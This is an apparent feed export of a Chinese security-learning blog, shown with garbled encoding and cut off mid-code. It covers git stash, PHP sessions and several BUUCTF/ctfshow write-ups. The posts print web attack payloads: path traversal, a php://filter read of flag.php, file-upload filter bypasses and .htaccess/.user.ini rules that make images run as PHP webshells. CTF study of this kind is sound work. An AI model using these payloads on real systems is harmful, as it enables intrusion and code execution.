        <content type="html"><![CDATA[<span id="more"></span><h1>ç”¨é€”</h1><h2>git stashå½“å‰ä¿®æ”¹</h2>git stash ä¼šå°†å½“å‰æ­£åœ¨è¿›è¡Œçš„æ–‡ä»¶ä¿å­˜ä¸‹æ¥ï¼ˆåŒ…æ‹¬æš‚å­˜å’Œéæš‚å­˜çš„ï¼‰ï¼Œç„¶åå¯ä»¥æ¢å¤å®Œæ•´çš„å·¥ä½œç›®å½•ï¼Œæ¯”å¦‚ä¸‹é¢çš„å·¥ä½œçŠ¶æ€ï¼Œé€šè¿‡git stashæ¨é€ä¸€ä¸ªæ–°çš„å‚¨å­˜ï¼Œå½“å‰çš„å·¥ä½œç›®å½•å°±å¹²å‡€äº†ã€‚<pre><code>$ git statusOn branch masterChanges to be committed:new file:   style.cssChanges not staged for commit:modified:   index.html$ git stashSaved working directory and index state WIP on master: 5002d47 our new homepageHEAD is now at 5002d47 our new homepage$ git statusOn branch masternothing to commit, working tree clean</code></pre><p>éœ€è¦è¯´æ˜ä¸€ç‚¹ï¼Œstashæ˜¯æœ¬åœ°çš„ä¸ä¼šé€šè¿‡git pushå‘½ä»¤ä¸Šä¼ åˆ°ç»™git serve ï¼Œå®é™…åº”ç”¨æ¨èç»™æ¯ä¸ªstashåŠ ä¸€ä¸ªmessageï¼Œç”¨äºè®°å½•ç‰ˆæœ¬ï¼Œä½¿ç”¨<br>git stash saveå–ä»£åŸæ¥çš„</p><pre><code>$ git stash save &quot;test-cmd-stash&quot;Saved working directory and index state On autoswitch: test-cmd-stashHEAD ç°åœ¨ä½äº 296e8d4 remove unnecessary postion reset in onResume function$ git stash liststash@&#123;0&#125;: On autoswitch: test-cmd-stash</code></pre><h2>é‡æ–°åº”ç”¨ç¼“å­˜çš„stash</h2><p>å¯ä»¥é€šè¿‡git stash popå‘½ä»¤æ¢å¤åŸæ¥çš„æ“ä½œ</p><pre><code>$ git statusOn branch masternothing to commit, working tree clean$ git stash popOn branch masterChanges to be committed: new file:   style.cssChanges not staged for commit:modified:   index.htmlDropped refs/stash@&#123;0&#125; (32b3aa1d185dfe6d57b3c3cc3b32cbf3e380cc6a)</code></pre><p>è¿™ä¸ªå‘½ä»¤ä¼šå°†stashç¼“å­˜å»ºç«™ä¸­çš„ç¬¬ä¸€ä¸ªstashåˆ é™¤ï¼Œå¹¶å°†å¯¹åº”ä¿®æ”¹åº”ç”¨åˆ°å½“å‰çš„å·¥ä½œç›®å½•ä¸‹</p><p>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨git stash applyå‘½ä»¤ï¼Œå°†ç¼“å­˜å †æ ˆä¸­çš„stashå¤šæ¬¡åº”ç”¨åˆ°å·¥ä½œç›®å½•ä¸­ï¼Œä½†å¹¶ä¸åˆ é™¤stashæ‹·è´ã€‚</p><pre><code>$ git stash applyOn branch masterChanges to be committed:new file:   style.cssChanges not staged for commit:modified:   index.html</code></pre><h2>æŸ¥çœ‹æ‰€æœ‰çš„stash</h2><p>å¯ä»¥ä½¿ç”¨git stash listï¼Œå»æŸ¥çœ‹æ‰€æœ‰çš„stash</p><pre><code>$ git stash liststash@&#123;0&#125;: WIP on master: 049d078 added the index filestash@&#123;1&#125;: WIP on master: c264051 Revert &quot;added file_size&quot;stash@&#123;2&#125;: WIP on master: 21d80a5 added number to log</code></pre><p>åœ¨ä½¿ç”¨git stash applyå‘½ä»¤çš„æ—¶å€™å¯ä»¥ä½¿ç”¨stash@{0}ï¼ŒæŒ‡å®šæ¢å¤å“ªä¸€ä¸ªï¼Œé»˜è®¤ä½¿ç”¨stash@{0}</p><h2>ç§»é™¤æ‰€æœ‰çš„stash</h2>git stash drop<p>è‹¥æœæ˜¯git stash@{0} dropæŒ‡å®šåˆ é™¤å“ªä¸€ä¸ª</p><p>git stash cleanåˆ é™¤å…¨éƒ¨</p><h2>æŸ¥çœ‹æŒ‡å®šstashçš„diff</h2>diffï¼šæ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„ä¸åŒ<p>ç”¨ git stash show</p><pre><code>$ git stash showindex.html | 1 +style.css | 3 +++2 files changed, 4 insertions(+)</code></pre><p>æ·»åŠ -pæˆ–â€“patchæŸ¥çœ‹æŒ‡å®šstashçš„å…¨éƒ¨diff</p><pre><code> $ git stash show -pdiff --git a/style.css b/style.cssnew file mode 100644index 0000000..d92368b --- /dev/null +++ b/style.css@@ -0,0 +1,3 @@ +* &#123; +  text-decoration: blink;+&#125;diff --git a/index.html b/index.html index 9daeafb..ebdcbd2 100644 --- a/index.html +++ b/index.html@@ -1 +1,2 @@ +&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;/&gt;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ— æ ‡é¢˜</title>
      <link href="/2021/02/23/%E6%97%A0%E6%A0%87%E9%A2%98/"/>
      <url>/2021/02/23/%E6%97%A0%E6%A0%87%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>ç”µè„‘ç»ˆäºå›æ¥äº†</p><span id="more"></span><p>ä¸€ä¸ä¸æ°´å¼•èµ·çš„ç¥¸æ‚£ï¼Œå®³çœŸçš„æ˜¯ï¼è¿™å‡ å¤©ä¸€ç›´æ²¡åŠæ³•æ›´åš</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buusecret fileï¼Œeasy sqlï¼Œknifeï¼ˆwarm up åˆåšäº†ä¸€éï¼‰</title>
      <link href="/2021/02/15/buu%E5%A4%8D%E4%B9%A0/"/>
      <url>/2021/02/15/buu%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>warm up</h1><p>è¿™é“é¢˜ï¼Œæˆ‘åœ¨äºŒåˆ·çš„æ—¶å€™å‘ç°è‡ªå·±ä¸€åˆ·çš„æ¼æ‰ä¸€ä¸ªå¾ˆå…³é”®çš„ç‚¹ã€‚include</p><p>includeå¯ä»¥è·å¾—æŒ‡å®šæ–‡ä»¶ä¸­ï¼Œæ‰€æœ‰çš„æ–‡ä»¶/ä»£ç /æ ‡è®°ï¼Œå¹¶æŠŠå®ƒå¤åˆ¶ç»™ä½¿ç”¨includeçš„æ–‡ä»¶ä¸­ï¼Œè¿™å°±è§£é‡Šäº†ä¸ºä»€ä¹ˆurlä¸­å¯ä»¥ç›´æ¥å°†ç»•è¿‡å’Œæ–‡ä»¶åŒ…å«æ‹¼æ¥åœ¨ä¸€èµ·ã€‚</p><p>?file=hint.php?../../../../../ffffllllaaaagggg</p><h2>easy sql</h2><p>è¿‡æ»¤çš„ä¸œè¥¿æœ‰ç‚¹å¤š</p><p>åæ­£å°±æ˜¯æ•°å€¼å‹æ³¨å…¥ï¼Œä½†æ˜¯åšçš„æ—¶å€™å¥½åƒæ˜¯çœ‹åˆ°æºç ï¼Œæˆ‘å‡†å¤‡æ‰«ä¸€ä¸‹ç›®å½•ï¼Œæ²¡ç”¨ï¼Œæ²¡å•¥å¤´ç»ªï¼Œæ˜å¤©å†çœ‹çœ‹</p><h2>secret file</h2><p>secretå’Œendä¹‹é—´åº”è¯¥æœ‰ä»€ä¹ˆè”ç³»ï¼ŒæŠ“åŒ…çœ‹çœ‹</p><p>æœ‰æç¤ºsecr3t.php </p><p>/flagæ”¾åœ¨äº†flag.phpé‡Œ</p><p>è¯´æˆ‘å°±åœ¨è¿™é‡Œä½†æ˜¯ä½ çœ‹ä¸åˆ°æˆ‘</p><p>æ³¨æ„ï¼Œåˆšæ‰æ²¡æœ‰çœ‹åˆ°ï¼Œsecrst.phpä¸­æœ‰</p><pre><code>&lt;html&gt;&lt;title&gt;secret&lt;/title&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?phphighlight_file(__FILE__);error_reporting(0);$file=$_GET[&#39;file&#39;];if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;    echo &quot;Oh no!&quot;;    exit();&#125;include($file); //flagæ”¾åœ¨äº†flag.phpé‡Œ?&gt;&lt;/html&gt;</code></pre><p>æˆ‘ç”¨fileåè®®ï¼Œæ²¡æœ‰æˆåŠŸï¼Œç„¶åç”¨æ¥phpï¼š//filter/read=convert.base64-encoding/resource=flag.php</p><p>å¾—åˆ°flag{6845a78a-dadb-4e66-8499-35b687755fea}</p><h2>ping ping ping</h2><p>å¥½ä¼¤å¿ƒå•Šï¼Œæ˜¨å¤©å†™äº†æ²¡æœ‰ä¿å­˜ï¼Œå®³</p><h2>knife</h2><p>å› ä¸ºç›´æ¥ç»™äº†è¿æ¥å¯†ç ï¼Œç›´æ¥èœåˆ€ç»ƒä¸Šå»å°±å¯ä»¥äº†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2021/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>æ–‡ä»¶ä¸Šä¼ </h1><h2>å‰ç«¯æ£€æŸ¥</h2>å¯¹åº”ctfshowç¬¬ä¸€é“é¢˜ï¼Œå…ˆä¸Šä¼ a.pngï¼Œç„¶åbpæŠ“åŒ…åæ›´æ”¹æ–‡ä»¶åä¸ºa.php,è¿æ¥å¾—åˆ°æ•°æ®ã€‚<p>ä¸ºä»€ä¹ˆä¸èƒ½ä¸æ›´æ”¹.phpåç¼€ï¼Œå¯èƒ½æ˜¯æ²¡åŠæ³•è§£ææ–‡ä»¶ã€‚</p><h2>åç«¯æ£€æŸ¥</h2><li>å¤§å°å†™ç»•è¿‡åœ¨windowsä¸‹ï¼Œå¯ä»¥å°†åç¼€æ”¹ä¸ºpHp<li>unicode<p>å½“ç›®æ ‡å­˜åœ¨json_decodeä¸”æ£€æŸ¥åœ¨json_decodeä¹‹å‰ï¼Œå¯ä»¥å°†phpæ”¹å†™ä¸º\0070hp</p><li>ä½¿ç”¨.user.ini,<pre><code> GIF89A auto_prepend_file=a.png auto_append_file=a.png</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>session</title>
      <link href="/2021/02/12/session/"/>
      <url>/2021/02/12/session/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>session</h1><p>Sessionçš„ä¸­æ–‡è¯‘åå«åšâ€œä¼šè¯â€ï¼Œå…¶æœ¬æ¥çš„å«ä¹‰æ˜¯æŒ‡æœ‰å§‹æœ‰ç»ˆçš„ä¸€ç³»åˆ—åŠ¨ä½œ/æ¶ˆæ¯ï¼Œæ¯”å¦‚æ‰“ç”µè¯æ—¶ä»æ‹¿èµ·ç”µè¯æ‹¨å·åˆ°æŒ‚æ–­ç”µè¯è¿™ä¸­é—´çš„ä¸€ç³»åˆ—è¿‡ç¨‹å¯ä»¥ç§°ä¹‹ä¸ºä¸€ä¸ªsessionã€‚ç›®å‰ç¤¾ä¼šä¸Šå¯¹sessionçš„ç†è§£éå¸¸æ··ä¹±ï¼šæœ‰æ—¶å€™æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™æ ·çš„è¯â€œåœ¨ä¸€ä¸ªæµè§ˆå™¨ä¼šè¯æœŸé—´ï¼Œâ€¦â€ï¼Œè¿™é‡Œçš„ä¼šè¯æ˜¯æŒ‡ä»ä¸€ä¸ªæµè§ˆå™¨çª—å£æ‰“å¼€åˆ°å…³é—­è¿™ä¸ªæœŸé—´ï¼›ä¹Ÿå¯ä»¥çœ‹åˆ°â€œç”¨æˆ·ï¼ˆå®¢æˆ·ç«¯ï¼‰åœ¨ä¸€æ¬¡ä¼šè¯æœŸé—´â€è¿™æ ·ä¸€å¥è¯ï¼Œå®ƒå¯èƒ½æŒ‡ç”¨æˆ·çš„ä¸€ç³»åˆ—åŠ¨ä½œï¼ˆä¸€èˆ¬æƒ…å†µä¸‹æ˜¯åŒæŸä¸ªå…·ä½“ç›®çš„ç›¸å…³çš„ä¸€ç³»åˆ—åŠ¨ä½œï¼Œæ¯”å¦‚ä»ç™»å½•åˆ°é€‰è´­å•†å“åˆ°ç»“è´¦ç™»å‡ºè¿™æ ·ä¸€ä¸ªç½‘ä¸Šè´­ç‰©çš„è¿‡ç¨‹ï¼›ç„¶è€Œæœ‰æ—¶å€™ä¹Ÿå¯èƒ½ä»…ä»…æ˜¯æŒ‡ä¸€æ¬¡è¿æ¥ï¼›å…¶ä¸­çš„å·®åˆ«åªèƒ½é ä¸Šä¸‹æ–‡æ¥æ¨æ–­äº†ã€‚</p><p> ç„¶è€Œå½“sessionä¸€è¯ä¸ç½‘ç»œåè®®ç›¸å…³è”æ—¶ï¼Œå®ƒåˆå¾€å¾€éšå«äº†â€œé¢å‘è¿æ¥â€å’Œ/æˆ–â€œä¿æŒçŠ¶æ€â€è¿™æ ·ä¸¤ä¸ªå«ä¹‰ï¼Œâ€œé¢å‘è¿æ¥â€æŒ‡çš„æ˜¯åœ¨é€šä¿¡åŒæ–¹åœ¨é€šä¿¡ä¹‹å‰è¦å…ˆå»ºç«‹ä¸€ä¸ªé€šä¿¡çš„æ¸ é“ï¼Œæ¯”å¦‚æ‰“ç”µè¯ï¼Œç›´åˆ°å¯¹æ–¹æ¥äº†ç”µè¯é€šä¿¡æ‰èƒ½å¼€å§‹ã€‚â€œä¿æŒçŠ¶æ€â€åˆ™æ˜¯æŒ‡é€šä¿¡çš„ä¸€æ–¹èƒ½å¤ŸæŠŠä¸€ç³»åˆ—çš„æ¶ˆæ¯å…³è”èµ·æ¥ï¼Œä½¿å¾—æ¶ˆæ¯ä¹‹é—´å¯ä»¥äº’ç›¸ä¾èµ–ï¼Œæ¯”å¦‚ä¸€ä¸ªæœåŠ¡å‘˜èƒ½å¤Ÿè®¤å‡ºå†æ¬¡å…‰ä¸´çš„è€é¡¾å®¢å¹¶ä¸”è®°å¾—ä¸Šæ¬¡è¿™ä¸ªé¡¾å®¢è¿˜æ¬ åº—é‡Œä¸€å—é’±ã€‚è¿™ä¸€ç±»çš„ä¾‹å­æœ‰â€œä¸€ä¸ªTCP sessionâ€æˆ–è€…â€œä¸€ä¸ªPOP3 sessionâ€ã€‚</p><p>é‰´äºè¿™ç§æ··ä¹±å·²ä¸å¯æ”¹å˜ï¼Œè¦ä¸ºsessionä¸‹ä¸ªå®šä¹‰å°±å¾ˆéš¾æœ‰ç»Ÿä¸€çš„æ ‡å‡†ã€‚è€Œåœ¨é˜…è¯»sessionç›¸å…³èµ„æ–™æ—¶ï¼Œæˆ‘ä»¬ä¹Ÿåªæœ‰é ä¸Šä¸‹æ–‡æ¥æ¨æ–­ç†è§£äº†ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥è¿™æ ·ç†è§£ï¼šä¾‹å¦‚æˆ‘ä»¬æ‰“ç”µè¯ï¼Œä»æ‹¨é€šçš„é‚£ä¸€åˆ»èµ·åˆ°æŒ‚æ–­ç”µè¯æœŸé—´ï¼Œå› ä¸ºç”µè¯ä¸€ç›´ä¿æŒç€æ¥é€šçš„çŠ¶æ€ï¼Œæ‰€ä»¥æŠŠè¿™ç§æ¥é€šçš„çŠ¶æ€å«åšsessionã€‚å®ƒæ˜¯è®¿å®¢ä¸æ•´ä¸ªç½‘ç«™äº¤äº’è¿‡ç¨‹ä¸­ä¸€ç›´å­˜åœ¨çš„å…¬æœ‰å˜é‡ï¼Œåœ¨å®¢æˆ·ç«¯ä¸æ”¯æŒCOOKIEçš„æ—¶å€™ï¼Œä¸ºäº†ä¿è¯æ•°æ®æ­£ç¡®ã€å®‰å…¨ï¼Œå°±é‡‡ç”¨SESSIONå˜é‡ã€‚è®¿é—®ç½‘ç«™çš„æ¥å®¢ä¼šè¢«åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œå³æ‰€è°“çš„ä¼šè¯ IDã€‚å®ƒè¦ä¹ˆå­˜æ”¾åœ¨å®¢æˆ·ç«¯çš„ cookieï¼Œè¦ä¹ˆç»ç”± URLä¼ é€’ã€‚</p><p>SESSIONçš„å‘æ˜å¡«è¡¥äº†HTTPåè®®çš„å±€é™ï¼šHTTPåè®®è¢«è®¤ä¸ºæ˜¯æ— çŠ¶æ€åè®®ï¼Œæ— æ³•å¾—çŸ¥ç”¨æˆ·çš„æµè§ˆçŠ¶æ€ï¼Œå½“å®ƒåœ¨æœåŠ¡ç«¯å®Œæˆå“åº”ä¹‹åï¼ŒæœåŠ¡å™¨å°±å¤±å»äº†ä¸è¯¥æµè§ˆå™¨çš„è”ç³»ã€‚è¿™ä¸HTTPåè®®æœ¬æ¥çš„ç›®çš„æ˜¯ç›¸ç¬¦çš„ï¼Œå®¢æˆ·ç«¯åªéœ€è¦ç®€å•çš„å‘æœåŠ¡å™¨è¯·æ±‚ä¸‹è½½æŸäº›æ–‡ä»¶ï¼Œæ— è®ºæ˜¯å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡å™¨éƒ½æ²¡æœ‰å¿…è¦çºªå½•å½¼æ­¤è¿‡å»çš„è¡Œä¸ºï¼Œæ¯ä¸€æ¬¡è¯·æ±‚ä¹‹é—´éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œå¥½æ¯”ä¸€ä¸ªé¡¾å®¢å’Œä¸€ä¸ªè‡ªåŠ¨å”®è´§æœºæˆ–è€…ä¸€ä¸ªæ™®é€šçš„ï¼ˆéä¼šå‘˜åˆ¶ï¼‰å¤§å–åœºä¹‹é—´çš„å…³ç³»ä¸€æ ·ã€‚</p><p>å› æ­¤é€šè¿‡SESSION(cookieæ˜¯å¦å¤–ä¸€ç§è§£å†³åŠæ³•)è®°å½•ç”¨æˆ·çš„æœ‰å…³ä¿¡æ¯ï¼Œä»¥ä¾›ç”¨æˆ·å†æ¬¡ä»¥æ­¤èº«ä»½å¯¹webæœåŠ¡å™¨æèµ·è¯·æ±‚æ—¶ä½œç¡®è®¤ã€‚ä¼šè¯çš„å‘æ˜ä½¿å¾—ä¸€ä¸ªç”¨æˆ·åœ¨å¤šä¸ªé¡µé¢é—´åˆ‡æ¢æ—¶èƒ½å¤Ÿä¿å­˜ä»–çš„ä¿¡æ¯ã€‚ç½‘ç«™ç¼–ç¨‹äººå‘˜éƒ½æœ‰è¿™æ ·çš„ä½“ä¼šï¼Œæ¯ä¸€é¡µä¸­çš„å˜é‡æ˜¯ä¸èƒ½åœ¨ä¸‹ä¸€é¡µä¸­ä½¿ç”¨çš„(è™½ç„¶formï¼Œurlä¹Ÿå¯ä»¥å®ç°ï¼Œä½†è¿™éƒ½æ˜¯éå¸¸ä¸ç†æƒ³çš„åŠæ³•)ï¼Œè€ŒSESSIONä¸­æ³¨å†Œçš„å˜é‡å°±å¯ä»¥ä½œä¸ºå…¨å±€å˜é‡ä½¿ç”¨äº†ã€‚</p><p>é‚£ä¹ˆSESSIONåˆ°åº•æœ‰ä»€ä¹ˆç”¨å¤„å‘¢ï¼Ÿç½‘ä¸Šè´­ç‰©æ—¶å¤§å®¶éƒ½ç”¨è¿‡è´­ç‰©è½¦ï¼Œä½ å¯ä»¥éšæ—¶æŠŠä½ é€‰è´­çš„å•†å“åŠ å…¥åˆ°è´­ç‰©è½¦ä¸­ï¼Œæœ€åå†å»æ”¶é“¶å°ç»“å¸ã€‚åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­è´­ç‰©è½¦ä¸€ç›´æ‰®æ¼”ç€ä¸´æ—¶å­˜è´®è¢«é€‰å•†å“çš„è§’è‰²ï¼Œç”¨å®ƒè¿½è¸ªç”¨æˆ·åœ¨ç½‘ç«™ä¸Šçš„æ´»åŠ¨æƒ…å†µï¼Œè¿™å°±æ˜¯SESSIONçš„ä½œç”¨ï¼Œå®ƒå¯ä»¥ç”¨äºç”¨æˆ·èº«ä»½è®¤è¯ï¼Œç¨‹åºçŠ¶æ€è®°å½•ï¼Œé¡µé¢ä¹‹é—´å‚æ•°ä¼ é€’ç­‰ã€‚</p><p>SESSION çš„å®ç°ä¸­é‡‡ç”¨COOKIEæŠ€æœ¯ï¼ŒSESSIONä¼šåœ¨å®¢æˆ·ç«¯ä¿å­˜ä¸€ä¸ªåŒ…å«session_id(SESSIONç¼–å·)çš„COOKIEï¼›åœ¨æœåŠ¡å™¨ç«¯ä¿å­˜å…¶ä»– sessionå˜é‡ï¼Œæ¯”å¦‚session_nameç­‰ç­‰ã€‚å½“ç”¨æˆ·è¯·æ±‚æœåŠ¡å™¨æ—¶ä¹ŸæŠŠsession_idä¸€èµ·å‘é€åˆ°æœåŠ¡å™¨ï¼Œé€šè¿‡session_idæå–æ‰€ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯çš„å˜é‡ï¼Œå°±èƒ½è¯†åˆ«ç”¨æˆ·æ˜¯è°äº†ã€‚åŒæ—¶ä¹Ÿä¸éš¾ç†è§£ä¸ºä»€ä¹ˆSESSIONæœ‰æ—¶ä¼šå¤±æ•ˆäº†ã€‚</p><p>å½“å®¢æˆ·ç«¯ç¦ç”¨COOKIEæ—¶(ç‚¹å‡»IEä¸­çš„â€œå·¥å…·â€â€”â€œinternet=â€â€&gt;Interneté€‰é¡¹â€ï¼Œåœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†é‡Œç‚¹å‡»â€œå®‰å…¨â€â€”â€œè‡ªå®šä¹‰çº§åˆ«â€é¡¹ï¼Œå°†â€œå…è®¸æ¯ä¸ªå¯¹è¯COOKIEâ€è®¾ä¸ºç¦ç”¨)ï¼Œsession_idå°†æ— æ³•ä¼ é€’ï¼Œæ­¤æ—¶SESSIONå¤±æ•ˆã€‚ä¸è¿‡php5åœ¨Linux/unixå¹³å°å¯ä»¥è‡ªåŠ¨æ£€æŸ¥cookieçŠ¶æ€ï¼Œå¦‚æœå®¢æˆ·ç«¯è®¾ç½®äº†ç¦ç”¨ï¼Œåˆ™ç³»ç»Ÿè‡ªåŠ¨æŠŠsession_idé™„åŠ åˆ°urlä¸Šä¼ é€’ã€‚windowsä¸»æœºåˆ™æ— æ­¤åŠŸèƒ½ã€‚     </p><h2>sessionå¸¸ç”¨å‡½æ•°åŠç”¨æ³•</h2> Session_start()ï¼šå¼€å§‹ä¸€ä¸ªä¼šè¯æˆ–è€…è¿”å›å·²ç»å­˜åœ¨çš„ä¼šè¯ã€‚<p>è¯´æ˜ï¼šè¿™ä¸ªå‡½æ•°æ²¡æœ‰å‚æ•°ï¼Œä¸”è¿”å›å€¼å‡ä¸ºtrueã€‚å¦‚æœä½ ä½¿ç”¨åŸºäºcookieçš„session(cookie-based sessions),é‚£ä¹ˆåœ¨ä½¿ç”¨Session_start()ä¹‹å‰æµè§ˆå™¨ä¸èƒ½æœ‰ä»»ä½•è¾“å‡ºï¼Œå¦åˆ™ä¼šå‘ç”Ÿä»¥ä¸‹é”™è¯¯ï¼š</p><p>Warning: Cannot send session cache limiter - headers already sent (output started at /usr/local/apache/htdocs/cga/member/1.PHP:2)â€¦â€¦â€¦â€¦</p><p>ä½ å¯ä»¥åœ¨php=â€â€&gt;php.inié‡Œå¯åŠ¨session.auto_start=1ï¼Œè¿™æ ·å°±æ— éœ€æ¯æ¬¡ä½¿ç”¨sessionä¹‹å‰éƒ½è¦è°ƒç”¨session_start()ã€‚ä½†å¯ç”¨è¯¥é€‰é¡¹ä¹Ÿæœ‰ä¸€äº›é™åˆ¶ï¼Œå¦‚æœç¡®å®å¯ç”¨äº† session.auto_startï¼Œåˆ™ä¸èƒ½å°†å¯¹è±¡æ”¾å…¥ä¼šè¯ä¸­ï¼Œå› ä¸ºç±»å®šä¹‰å¿…é¡»åœ¨å¯åŠ¨ä¼šè¯ä¹‹å‰åŠ è½½ä»¥åœ¨ä¼šè¯ä¸­é‡å»ºå¯¹è±¡ã€‚<br>è¯·æ±‚ç»“æŸåæ‰€æœ‰æ³¨å†Œçš„å˜é‡éƒ½ä¼šè¢«åºåˆ—åŒ–ã€‚å·²æ³¨å†Œä½†æœªå®šä¹‰çš„å˜é‡è¢«æ ‡è®°ä¸ºæœªå®šä¹‰ã€‚åœ¨ä¹‹åçš„è®¿é—®ä¸­è¿™äº›å˜é‡ä¹Ÿæœªè¢«ä¼šè¯æ¨¡å—å®šä¹‰ï¼Œé™¤éç”¨æˆ·ä»¥åå®šä¹‰å®ƒä»¬ã€‚</p><p>è­¦å‘Š:æœ‰äº›ç±»å‹çš„æ•°æ®ä¸èƒ½è¢«åºåˆ—åŒ–å› æ­¤ä¹Ÿå°±ä¸èƒ½ä¿å­˜åœ¨ä¼šè¯ä¸­ã€‚åŒ…æ‹¬ resourceå˜é‡æˆ–è€…æœ‰å¾ªç¯å¼•ç”¨çš„å¯¹è±¡ï¼ˆå³æŸå¯¹è±¡å°†ä¸€ä¸ªæŒ‡å‘è‡ªå·±çš„å¼•ç”¨ä¼ é€’ç»™å¦ä¸€ä¸ªå¯¹è±¡ï¼‰ã€‚</p><p>æ³¨å†ŒSESSIONå˜é‡ï¼š</p><p>PHP5ä½¿ç”¨$_SESSION[â€˜xxxâ€™]=xxxæ³¨å†ŒSESSIONå…¨å±€å˜é‡ã€‚å’ŒGETï¼ŒPOSTï¼ŒCOOKIEçš„ä½¿ç”¨æ–¹æ³•ç›¸ä¼¼ã€‚</p><p>æ³¨æ„ï¼šsession_register()ï¼Œsession_unregisterï¼Œsession_is_registeredåœ¨php5ä¸‹ä¸å†ä½¿ç”¨ï¼Œé™¤éåœ¨php.inié‡ŒæŠŠregister_globleè®¾ä¸ºonï¼Œä¸è¿‡å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œå¼ºçƒˆå»ºè®®å…³é—­register_globleã€‚HTTP_SESSION_VARSä¹Ÿä¸æå€¡ä½¿ç”¨äº†ï¼Œå®˜æ–¹å»ºè®®ç”¨$_SESSIONä»£æ›¿ä¹‹ã€‚ä¾‹å¦‚ï¼š</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>.htaccesså’Œ.user.inié…ç½®æ–‡ä»¶çš„å¦™ç”¨</title>
      <link href="/2021/02/10/htaccess%E5%92%8C-user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%A6%99%E7%94%A8/"/>
      <url>/2021/02/10/htaccess%E5%92%8C-user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%A6%99%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>.htaccess</h1>httpd-confæ˜¯Apacheï¼ˆhttps://baike.baidu.com/item/Apache/6265?fr=aladdinï¼‰çš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ªwebæœåŠ¡å™¨èµ·ä½œç”¨ï¼›è€Œ.htaccessä¹Ÿæ˜¯Apacheçš„é…ç½®æ–‡ä»¶ï¼Œä¸è¿‡ç›¸å½“äºä¸€ä¸ªå±€éƒ¨é…ç½®æ–‡ä»¶ï¼Œåªå¯¹è¯¥æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹çš„æ–‡ä»¶èµ·ä½œç”¨ã€‚<h2>å®ä¾‹</h2>åœ¨ç»•è¿‡æ–‡ä»¶ä¸Šä¼ çš„é™åˆ¶ä¸­ï¼Œé€šå¸¸åœ¨Apacheå…¨å±€é…ç½®æ–‡ä»¶httpd.confä¸­æœ‰è¿™æ ·ä¸€æ¡é…ç½®ï¼š<pre><code>     Addtype application/x-httped-php .php .phtml</code></pre><p>è¿™æ¡é…ç½®çš„æ„æ€æ˜¯å°†.phpï¼Œ.phtmlæ–‡ä»¶åç¼€çš„æ–‡ä»¶å½“ä½œphpæ–‡ä»¶æ‰§è¡Œï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåœ¨æ–‡ä»¶ä¸­å¯ä»¥å°è¯•ä¸Šä¼ phtmlï¼Œä¸è¿‡åœ¨é«˜ç‰ˆæœ¬ä¸­è¿™æ¡é…ç½®æ˜¯å…³é—­çš„ï¼Œä¹Ÿå°±æ˜¯åªèƒ½è§£æ.phpæ–‡ä»¶åç¼€ã€‚</p><p>æˆ–è€…è¿™æ¡é…ç½®ï¼š</p><pre><code>   sethandler application/x-httpd-php</code></pre><p>å°†æ‰€æœ‰æ–‡ä»¶éƒ½è§£ææˆphphæ–‡ä»¶ã€‚</p><p>é€šå¸¸å…¨å±€æ–‡ä»¶æˆ‘ä»¬æ˜¯ä¸èƒ½æ›´æ”¹çš„ï¼Œè€Œåœ¨Apacheè¿˜æœ‰ä¸€ä¸ªå±€éƒ¨é…ç½®æ–‡ä»¶.htacess,è¿™ä¸ªé…ç½®æ–‡ä»¶åªåœ¨è¯¥ç›®å½•ä¸‹çš„webç›®å½•èµ·ä½œç”¨ã€‚ä¾‹å¦‚ï¼šæˆ‘ä»¬åœ¨wwwæ–‡ä»¶ä¸‹æœ‰ä¸€ä¸ª.htacessé…ç½®æ–‡ä»¶ï¼Œé…ç½®å†…å®¹ä¸º<mark>Addtype application/x-httpd-php .jpg</mark>,å°†æ‰€æœ‰çš„jpgæ–‡ä»¶éƒ½å½“ä½œphpæ–‡ä»¶è¿›è¡Œè§£æã€‚è¿™æ ·å¯ä»¥ç›´æ¥è§£æjpgåç¼€çš„webshellã€‚</p><pre><code>   // .htaccess  AddType application/x-httpd-php .jpg  // 1.jpg  &lt;?php 